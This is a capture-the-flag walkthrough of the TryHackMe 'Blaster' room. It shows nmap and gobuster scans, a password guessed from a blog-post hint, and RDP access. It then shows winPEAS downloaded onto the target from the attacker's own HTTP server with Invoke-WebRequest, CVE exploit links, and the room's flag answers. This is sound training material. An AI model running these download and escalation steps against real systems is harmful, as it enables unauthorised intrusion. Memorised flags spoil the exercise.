# TryHackMe-Blaster CTF

>Abdullah Rizwan | 17th September , 06:19 PM


## NMAP

```
export IP=10.10.74.61

```

Now we want to scan all ports that are open on the box so for this we are going to use `-p-` ports `-A` aggressive scan to look for all ports `-T4` is the speed of the result and `$IP` is IP variable.

```
nmap -p- -A -T4 $IP
```

```
Host is up (0.22s latency).                                                                                                                         
Not shown: 65520 closed ports                                                                                                                       
PORT      STATE SERVICE       VERSION                                                                                                               
80/tcp    open  http          Microsoft IIS httpd 10.0                                                                                              
| http-methods:                                                                                                                                     
|_  Potentially risky methods: TRACE                                                                                                                
|_http-server-header: Microsoft-IIS/10.0                                                                                                            
|_http-title: IIS Windows Server                                                                                                                    
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                 
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                         
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3306/tcp  open  mysql         MySQL (unauthorized)                                                                                                  
3389/tcp  open  ms-wbt-server Microsoft Terminal Services                                                                                           
| rdp-ntlm-info:                                                                                                                                    
|   Target_Name: RETROWEB                                                                                                                           
|   NetBIOS_Domain_Name: RETROWEB                                                                                                                   
|   NetBIOS_Computer_Name: RETROWEB                                                                                                                 
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2020-09-17T13:37:30+00:00                                                                                                          
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2020-05-21T21:44:38
|_Not valid after:  2020-11-20T21:44:38                             
|_ssl-date: 2020-09-17T13:37:36+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found                                                   
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found                                                   
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=9/17%OT=80%CT=1%CU=33259%PV=Y%DS=2%DC=T%G=Y%TM=5F6366A
OS:A)OPS(O1=M508NW8ST11%O2=M508NW8ST11%O3=M508NW8NNT11%O4=M508NW8ST11%O5=M5
OS:08NW8ST11%O6=M508ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M508NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-09-17T13:37:29
|_  start_date: 2020-09-17T13:23:20

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   175.30 ms 10.8.0.1
2   228.68 ms 10.10.74.61

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 786.80 seconds                                                                  

``` 

Web server is on http://10.10.74.61:80/

## Gobuster

```
gobuster dir -u 10.10.74.61 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.74.61
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/17 09:45:48 Starting gobuster
===============================================================
/retro (Status: 301)
Progress: 7068 / 220561 (3.20%)
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/09/17 09:50:04 Finished

```
By visiting the directory `/retro` we will find a username `Wade`.


By going through the page we will see a post

```
Ready Player One

by Wade

I can’t believe the movie based on my favorite book of all time is going to come out in a few days! Maybe it’s because my name is so similar to the main character, but I honestly feel a deep connection to the main character Wade. I keep mistyping the name of his avatar whenever I log in but I think I’ll eventually get it down. Either way, I’m really excited to see this movie! 

```
Now by googling the name of the avatar we will find `Parzival` which is the passworrd for `Wade`.



## Remmina (RDP)

Remmina is RDP client for linux

Simply launch the application and in the username insert `wade` in password `parzival` and you will be logged into windows machine.


```
THM{HACK_PLAYER_ONE}
```


Now that we have access to the machine we can run `winPEAS` on it to do that we first need to host it on our local machine 

```
python -m SimpleHTTPServer                                                            
Serving HTTP on 0.0.0.0 port 8000 ...

```

Then open powershell on target machine since `curl` isn't available.

```
Invoke-WebRequest http://10.8.94.60:8000/winPEAS.exe -O winPEAS.exe
```
And run the file.

```
 [!] CVE-2019-0836 : VULNERABLE
        [>] https://exploit-db.com/exploits/46718
        [>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/

       [!] CVE-2019-0841 : VULNERABLE
        [>] https://github.com/rogue-kdc/CVE-2019-0841
        [>] https://rastamouse.me/tags/cve-2019-0841/

       [!] CVE-2019-1064 : VULNERABLE
        [>] https://www.rythmstick.net/posts/cve-2019-1064/

       [!] CVE-2019-1130 : VULNERABLE
        [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear

       [!] CVE-2019-1253 : VULNERABLE
        [>] https://github.com/padovah4ck/CVE-2019-1253

       [!] CVE-2019-1315 : VULNERABLE
        [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html

       [!] CVE-2019-1385 : VULNERABLE
        [>] https://www.youtube.com/watch?v=K6gHnr-VkAg

       [!] CVE-2019-1388 : VULNERABLE
        [>] https://github.com/jas502n/CVE-2019-1388

       [!] CVE-2019-1405 : VULNERABLE
        [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/

```
You will see theses CVE's which are vulnerable to this machine for me internet explorer wasn't showing history so this method also works.


## Previlege Esacalation

This is the video which helps to escalate our privileges.

https://www.youtube.com/watch?v=3BQKpPNlTSo


```
THM{COIN_OPERATED_EXPLOITATION}
```
This is the root flag.